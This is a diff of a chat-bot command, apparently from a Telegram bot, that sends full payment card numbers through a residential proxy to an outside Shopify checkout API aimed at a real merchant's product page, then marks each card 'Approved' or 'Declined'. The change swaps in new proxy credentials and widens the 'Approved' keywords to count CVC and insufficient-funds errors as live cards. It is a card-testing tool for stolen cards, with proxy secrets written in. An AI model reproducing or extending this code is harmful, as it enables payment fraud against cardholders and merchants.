@@ -79,18 +79,18 @@ async def cmd_ss1(client, message):
                 "card": fullcc,
                 "product_url": "https://musicworksunlimited.com/products/cuddle-up-cuddle-cub-music-single",
                 "email": None,
-                "proxy": "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t",
+                "proxy": "proxy.speedproxies.net:12321:Indexui184a999e:4fba9e5235e8_country-us",
                 "ship_address": None,
                 "is_shippable": False
             }
         }
 
         try:
-            async with httpx.AsyncClient(timeout=20) as http_client:
+            async with httpx.AsyncClient(timeout=30) as http_client:
                 res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload)
                 response = res.json()
                 msg = response.get("message") or response.get("error") or "No response"
-                status = "Approved ✅" if any(x in msg.lower() for x in ["processedreceipt", "zip", "charged", "avs"]) else "Declined ❌"
+                status = "Approved ✅" if any(x in msg.lower() for x in ["processedreceipt", "zip", "charged", "incorrect_cvc", "insufficient", "avs"]) else "Declined ❌"
         except Exception as e:
             msg = f"Request failed: {e}"
             status = "Error ⚠️"
